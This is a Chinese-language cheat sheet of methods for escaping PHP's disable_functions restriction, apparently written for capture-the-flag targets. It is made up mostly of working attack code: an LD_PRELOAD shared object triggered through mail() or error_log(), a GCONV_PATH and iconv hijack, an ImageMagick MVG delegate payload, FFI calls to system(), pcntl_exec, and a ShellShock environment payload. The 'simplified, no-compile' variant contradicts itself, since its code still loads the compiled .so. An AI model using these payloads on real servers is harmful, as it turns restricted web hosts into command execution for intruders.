# disable_functions 绕过方法详解
## 方法 A: LD_PRELOAD + mail()/error_log()（首选）

**原理**：`putenv()` 设置 `LD_PRELOAD` 环境变量指向恶意 .so，当 `mail()` 或 `error_log()` 内部调用 `execve()` 启动 `/usr/sbin/sendmail` 时，恶意 .so 被加载执行。

**条件**：`putenv` + (`mail` 或 `error_log`) 未被禁用，Linux 系统

### Step 1: 编译恶意 .so

```bash
cat > /tmp/bypass.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__((constructor)) void payload() {
    const char *cmd = getenv("EVIL_CMD");
    if (cmd) {
        char buf[1024];
        snprintf(buf, sizeof(buf), "%s > /tmp/output.txt 2>&1", cmd);
        system(buf);
    }
}
EOF
gcc -shared -fPIC -o /tmp/bypass.so /tmp/bypass.c
```

### Step 2: 上传 bypass.so 到目标可写目录

常见可写目录：`/tmp/`、`/var/tmp/`、`/dev/shm/`、Web upload 目录

### Step 3: PHP 触发执行

```php
<?php
putenv("EVIL_CMD=cat /flag.txt");
putenv("LD_PRELOAD=/tmp/bypass.so");
mail("a@b.c", "", "");  // 触发 execve → 加载 .so
echo file_get_contents("/tmp/output.txt");
?>
```

**如果 mail() 被禁用**，用 `error_log("x", 1, "a@b.c");` 替代（同样触发 sendmail）。

### 简化版（无需编译 .so）

如果目标系统已有 `/usr/lib/x86_64-linux-gnu/libc.so.6`（几乎所有 Linux 都有）：

```php
<?php
// 直接利用已有的 .so，通过 LD_PRELOAD 劫持 getuid()
putenv("LD_PRELOAD=/tmp/bypass.so");
putenv("EVIL_CMD=id");
error_log("", 1, "", "");
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 B: iconv + LD_PRELOAD

**原理**：`iconv()` 函数在字符集转换时会加载 `/usr/lib/gconv/` 下的 .so 模块。通过 `GCONV_PATH` 环境变量指定自定义 gconv 模块目录。

**条件**：`putenv` + `iconv` 未被禁用（mail/error_log 被禁时的替代）

```php
<?php
// Step 1: 上传恶意 gconv-module 和 .so
// gconv-modules 文件内容：
// module  PAYLOAD//  INTERNAL  ../../../tmp/payload  2
// module  INTERNAL  PAYLOAD//  ../../../tmp/payload  2

putenv("GCONV_PATH=/tmp/");
iconv("PAYLOAD", "UTF-8", "x");  // 触发加载 /tmp/payload.so
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 C: ImageMagick delegate

**原理**：ImageMagick 处理特定格式时调用外部程序（delegate），可通过构造恶意 SVG/MVG 文件执行命令。

**条件**：`imagick` 扩展已加载

```php
<?php
// 构造 MVG payload
$payload = 'push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "ephemeral:|cat /flag.txt > /tmp/output.txt"
pop graphic-context';
file_put_contents("/tmp/payload.mvg", $payload);

$img = new Imagick("/tmp/payload.mvg");
echo file_get_contents("/tmp/output.txt");
?>
```

---

## 方法 D: FFI (PHP >= 7.4)

**原理**：PHP FFI (Foreign Function Interface) 可直接调用 C 函数，包括 `system()`。

**条件**：PHP >= 7.4 且 `ffi.enable=true`（或 `ffi.enable=preload`）

```php
<?php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("cat /flag.txt > /tmp/output.txt");
echo file_get_contents("/tmp/output.txt");
?>
```

**备选（popen）**：
```php
<?php
$ffi = FFI::cdef("
    void *popen(const char *command, const char *type);
    char *fgets(char *str, int n, void *stream);
    int pclose(void *stream);
", "libc.so.6");
$fp = $ffi->popen("cat /flag.txt", "r");
$buf = FFI::new("char[4096]");
while ($ffi->fgets($buf, 4096, $fp) !== null) {
    echo FFI::string($buf);
}
$ffi->pclose($fp);
?>
```

---

## 方法 E: PHP UAF (Use After Free)

**原理**：利用 PHP 引擎本身的内存漏洞绕过 disable_functions。

**适用版本**：
- PHP 7.0-7.4.x (多个 CVE)
- PHP Backtrace UAF: 7.0-7.4.x, 8.0-8.0.7

搜索利用脚本：
```bash
# 在 AboutSecurity 工具库中搜索
find /pentest/ -name "*disable*function*" -o -name "*php*uaf*" 2>/dev/null
# 或从 GitHub 获取
# https://github.com/mm0r1/exploits
```

---

## 方法 F: pcntl_exec()

**条件**：`pcntl` 扩展已加载且 `pcntl_exec` 未被禁用（CLI 模式常见）

```php
<?php
// pcntl_exec 替换当前进程（不返回）
// 需要先 fork
$pid = pcntl_fork();
if ($pid == 0) {
    // 子进程
    pcntl_exec("/bin/cat", ["/flag.txt"]);
} else {
    pcntl_wait($status);
}
?>
```

---

## 方法 G: ShellShock (CVE-2014-6271)

**条件**：Bash <= 4.3（老系统），`putenv` + `mail` 未被禁用

```php
<?php
putenv("PHP_LOL=() { :; }; cat /flag.txt > /tmp/output.txt");
mail("a@b.c", "", "");
echo file_get_contents("/tmp/output.txt");
?>
```
